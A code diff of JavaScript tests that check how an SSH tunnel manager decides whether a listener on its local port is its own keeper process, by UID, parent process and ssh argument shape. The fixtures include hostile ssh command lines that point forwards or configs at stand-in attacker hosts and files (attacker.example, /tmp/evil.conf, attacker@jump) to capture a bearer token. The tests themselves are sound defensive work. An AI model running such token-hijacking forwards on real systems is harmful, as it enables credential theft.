@@ -134,77 +134,50 @@ test("parsePortListeners extracts (command, pid), dropping header/blank lines", 
   assert.deepEqual(parsePortListeners("COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME\n"), []);
 });
 
-test("classifyPortOwner: ours requires OUR forward signature, not just COMMAND=ssh", () => {
+test("classifyPortOwner: provenance (UID + keeper ancestry) + the keeper's argv shape", () => {
   const spec = makeSpec();
-  const ours = [{ command: "ssh", pid: "123", argv: "/usr/bin/ssh -N -T -L 8080:127.0.0.1:8080 browse-gateway-tunnel" }];
-  assert.equal(classifyPortOwner(ours, spec), "ours");
+  const MYUID = 501;
+  // Build a listener; defaults are OUR provenance (current uid, parent = our keeper), overridable.
+  const mk = (argv, o = {}) => ({
+    command: o.command ?? "ssh",
+    pid: o.pid ?? "1",
+    uid: "uid" in o ? o.uid : MYUID,
+    argv,
+    parentCommand: "parentCommand" in o ? o.parentCommand : `/bin/sh ${spec.keeperPath}`,
+  });
+  const good = "/usr/bin/ssh -N -T -L 8080:127.0.0.1:8080 browse-gateway-tunnel";
 
-  // A FOREIGN ssh forward on the same port — COMMAND=ssh but a different forward + no alias token.
-  // The old bare-name check called this "ours"; it must now be "foreign".
-  const foreignSsh = [{ command: "ssh", pid: "200", argv: "/usr/bin/ssh -N -L 8080:10.0.0.5:5432 someone@otherhost" }];
-  assert.equal(classifyPortOwner(foreignSsh, spec), "foreign");
+  // Our real keeper invocation, owned by us, descending from our keeper.
+  assert.equal(classifyPortOwner([mk(good)], spec, MYUID), "ours");
 
-  // SUBSTRING ATTACK (F2): a foreign ssh forwards OUR local port to an attacker and mentions the
-  // alias only as a substring of an unrelated path — must be "foreign" (alias matched as a token).
-  const aliasSubstring = [
-    {
-      command: "ssh",
-      pid: "201",
-      argv: "/usr/bin/ssh -N -L 8080:127.0.0.1:8080 -o UserKnownHostsFile=/home/x/browse-gateway-tunnel.hosts evil@otherhost",
-    },
-  ];
-  assert.equal(classifyPortOwner(aliasSubstring, spec), "foreign");
+  // PROVENANCE (P1, PR #26 3rd review): a FOREIGN local account runs the EXACT allowlisted argv with
+  // its OWN ~/.ssh/config (alias → attacker). argv shape matches, but the UID does not → foreign.
+  assert.equal(classifyPortOwner([mk(good, { uid: MYUID + 1 })], spec, MYUID), "foreign");
+  // Same user, right argv, but NOT descended from our keeper (clean config, foreign parent) → foreign.
+  assert.equal(classifyPortOwner([mk(good, { parentCommand: "/bin/sh /tmp/evil.sh" })], spec, MYUID), "foreign");
+  assert.equal(classifyPortOwner([mk(good, { parentCommand: null })], spec, MYUID), "foreign");
 
-  // OPTION-VALUE ATTACK (P1, PR #26 review): a foreign ssh passes the alias as the `-l` LOGIN NAME
-  // while really dialing the attacker host and forwarding our local port. The alias appears as a
-  // token but is NOT the destination operand — must be "foreign", or connect sends the token there.
-  const aliasAsLoginName = [
-    { command: "ssh", pid: "202", argv: "ssh -N -l browse-gateway-tunnel -L 8080:127.0.0.1:8080 attacker@elsewhere" },
-  ];
-  assert.equal(classifyPortOwner(aliasAsLoginName, spec), "foreign");
-  // Same idea via -o / -i carrying the alias as a value.
-  const aliasAsOptValue = [
-    { command: "ssh", pid: "203", argv: "ssh -i browse-gateway-tunnel -L 8080:127.0.0.1:8080 attacker@host" },
-  ];
-  assert.equal(classifyPortOwner(aliasAsOptValue, spec), "foreign");
+  // argv-shape defenses (still enforced on top of provenance).
+  assert.equal(classifyPortOwner([mk("/usr/bin/ssh -N -L 8080:10.0.0.5:5432 someone@otherhost")], spec, MYUID), "foreign");
+  assert.equal(classifyPortOwner([mk("/usr/bin/ssh -N -L 8080:127.0.0.1:8080 -o UserKnownHostsFile=/home/x/browse-gateway-tunnel.hosts evil@h")], spec, MYUID), "foreign"); // alias as substring
+  assert.equal(classifyPortOwner([mk("ssh -N -l browse-gateway-tunnel -L 8080:127.0.0.1:8080 attacker@elsewhere")], spec, MYUID), "foreign"); // alias as -l value
+  assert.equal(classifyPortOwner([mk("ssh -N -T -o HostName=attacker.example -L 8080:127.0.0.1:8080 browse-gateway-tunnel")], spec, MYUID), "foreign"); // -o HostName
+  assert.equal(classifyPortOwner([mk("ssh -N -T -F /tmp/evil.conf -L 8080:127.0.0.1:8080 browse-gateway-tunnel")], spec, MYUID), "foreign"); // -F
+  assert.equal(classifyPortOwner([mk("ssh -N -T -J attacker@jump -L 8080:127.0.0.1:8080 browse-gateway-tunnel")], spec, MYUID), "foreign"); // -J
 
-  // CONFIG-OVERRIDE ATTACK (P1, PR #26 re-review): the destination operand IS our alias, but -o/-F/-J
-  // override where the alias resolves (HostName/alt-config/jump), so the forward — and the bearer
-  // token — goes to the attacker's ssh server. Only the keeper's -N/-T/-L shape is "ours".
-  const hostnameOverride = [
-    { command: "ssh", pid: "204", argv: "ssh -N -T -o HostName=attacker.example -L 8080:127.0.0.1:8080 browse-gateway-tunnel" },
-  ];
-  assert.equal(classifyPortOwner(hostnameOverride, spec), "foreign");
-  const altConfig = [
-    { command: "ssh", pid: "205", argv: "ssh -N -T -F /tmp/evil.conf -L 8080:127.0.0.1:8080 browse-gateway-tunnel" },
-  ];
-  assert.equal(classifyPortOwner(altConfig, spec), "foreign");
-  const jumpHost = [
-    { command: "ssh", pid: "206", argv: "ssh -N -T -J attacker@jump -L 8080:127.0.0.1:8080 browse-gateway-tunnel" },
-  ];
-  assert.equal(classifyPortOwner(jumpHost, spec), "foreign");
+  // gatewayHost DRIFT (F3): our own keeper still forwards the OLD target after a config change → ours.
+  assert.equal(classifyPortOwner([mk("/usr/bin/ssh -N -T -L 8080:127.0.0.1:9090 browse-gateway-tunnel")], spec, MYUID), "ours");
+  // Combined `-L8080:...` form (no space).
+  assert.equal(classifyPortOwner([mk("ssh -N -L8080:127.0.0.1:8080 browse-gateway-tunnel")], spec, MYUID), "ours");
 
-  // gatewayHost DRIFT (F3): our own healthy keeper still forwards the OLD target after a config
-  // change (the on-disk keeper is never rewritten). Local port + alias token still mark it "ours".
-  const drifted = [{ command: "ssh", pid: "5", argv: "/usr/bin/ssh -N -T -L 8080:127.0.0.1:9090 browse-gateway-tunnel" }];
-  assert.equal(classifyPortOwner(drifted, spec), "ours");
-
-  // Combined `-L8080:...` form (no space) is also recognized.
-  const combined = [{ command: "ssh", pid: "6", argv: "ssh -N -L8080:127.0.0.1:8080 browse-gateway-tunnel" }];
-  assert.equal(classifyPortOwner(combined, spec), "ours");
-
-  // Non-ssh binder.
-  assert.equal(classifyPortOwner([{ command: "node", pid: "999", argv: "node server.js" }], spec), "foreign");
-
-  // Unresolvable argv (ps failed) → fail closed.
-  assert.equal(classifyPortOwner([{ command: "ssh", pid: "123", argv: null }], spec), "foreign");
-
-  // Mixed: one ours + one foreign → foreign (EVERY listener must be ours).
-  assert.equal(classifyPortOwner([...ours, { command: "node", pid: "9", argv: "node x" }], spec), "foreign");
-
+  // Non-ssh binder; unresolvable argv → fail closed.
+  assert.equal(classifyPortOwner([mk("node server.js", { command: "node" })], spec, MYUID), "foreign");
+  assert.equal(classifyPortOwner([mk(null)], spec, MYUID), "foreign");
+  // Mixed: one ours + one foreign → foreign.
+  assert.equal(classifyPortOwner([mk(good), mk("node x", { command: "node" })], spec, MYUID), "foreign");
   // Nothing listening.
-  assert.equal(classifyPortOwner([], spec), "none");
-  assert.equal(classifyPortOwner(null, spec), "none");
+  assert.equal(classifyPortOwner([], spec, MYUID), "none");
+  assert.equal(classifyPortOwner(null, spec, MYUID), "none");
   rmSync(spec.home, { recursive: true, force: true });
 });
 
@@ -224,17 +197,39 @@ test("sshDestination locates the host operand, not an option value", () => {
   assert.equal(dest("ssh -N -L 8080:127.0.0.1:8080"), null);
 });
 
-test("tunnelState resolves listener argv via ps to distinguish our forward from a foreign ssh", async () => {
+// ps fake covering both call shapes: the `uid=,ppid=,command=` lookup and the parent `command=` lookup.
+function psFake(spec, { uid, ppid = "4240", argv, parent }) {
+  return (args) =>
+    args.join(" ").includes("uid=,ppid=,command=")
+      ? { code: 0, stdout: `${uid} ${ppid} ${argv}\n`, stderr: "" }
+      : { code: 0, stdout: `${parent ?? `/bin/sh ${spec.keeperPath}`}\n`, stderr: "" };
+}
+
+test("tunnelState: our own keeper listener (UID + parent + argv) is ours", async () => {
   const spec = makeSpec();
-  // A foreign ssh forward squatting on 8080 — lsof shows COMMAND=ssh, but ps reveals a different forward.
+  const myUid = process.getuid?.() ?? 0;
   const exec = fakeExec({
     launchctl: { code: 0, stdout: "state = running\npid = 5\n", stderr: "" },
-    lsof: { code: 0, stdout: "COMMAND PID USER\nssh 4242 user 5u IPv4 TCP 127.0.0.1:8080 (LISTEN)\n", stderr: "" },
-    ps: { code: 0, stdout: "ssh -N -L 8080:10.0.0.9:5432 attacker@elsewhere\n", stderr: "" },
+    lsof: { code: 0, stdout: "COMMAND PID USER\nssh 4242 me 5u IPv4 TCP 127.0.0.1:8080 (LISTEN)\n", stderr: "" },
+    ps: psFake(spec, { uid: myUid, argv: "/usr/bin/ssh -N -T -L 8080:127.0.0.1:8080 browse-gateway-tunnel" }),
   });
   const state = await tunnelState(spec, exec);
-  assert.equal(state.port, "foreign", "a foreign ssh forward is no longer mis-claimed as ours");
-  assert.ok(exec.calls.some((c) => c[0] === "ps" && c.includes("4242")), "argv resolved for the listening pid");
+  assert.equal(state.port, "ours");
+  assert.ok(exec.calls.some((c) => c[0] === "ps" && c.includes("4242")), "ps resolved the listening pid");
+  rmSync(spec.home, { recursive: true, force: true });
+});
+
+test("tunnelState: a FOREIGN-owned listener running the EXACT keeper argv is NOT ours (P1 provenance)", async () => {
+  const spec = makeSpec();
+  const foreignUid = (process.getuid?.() ?? 0) + 1;
+  const exec = fakeExec({
+    launchctl: { code: 0, stdout: "state = running\npid = 5\n", stderr: "" },
+    // lsof shows a foreign USER squatting on 8080; the argv is byte-for-byte our keeper's.
+    lsof: { code: 0, stdout: "COMMAND PID USER\nssh 4242 attacker 5u IPv4 TCP 127.0.0.1:8080 (LISTEN)\n", stderr: "" },
+    ps: psFake(spec, { uid: foreignUid, argv: "/usr/bin/ssh -N -T -L 8080:127.0.0.1:8080 browse-gateway-tunnel" }),
+  });
+  const state = await tunnelState(spec, exec);
+  assert.equal(state.port, "foreign", "exact keeper argv but a foreign UID must NOT be ours — or connect leaks the token");
   rmSync(spec.home, { recursive: true, force: true });
 });
 
@@ -329,7 +324,7 @@ test("ensureTunnel is a no-op when everything exists and runs; re-enables when s
   const runningExec = fakeExec({
     launchctl: { code: 0, stdout: "state = running\npid = 99\n", stderr: "" },
     lsof: { code: 0, stdout: "COMMAND PID\nssh 99 user 5u IPv4 TCP 127.0.0.1:8080 (LISTEN)\n", stderr: "" },
-    ps: { code: 0, stdout: "/usr/bin/ssh -N -T -L 8080:127.0.0.1:8080 browse-gateway-tunnel\n", stderr: "" },
+    ps: psFake(spec, { uid: process.getuid?.() ?? 0, ppid: "98", argv: "/usr/bin/ssh -N -T -L 8080:127.0.0.1:8080 browse-gateway-tunnel" }),
   });
   const noop = await ensureTunnel(spec, runningExec);
   assert.equal(noop.action, "none");
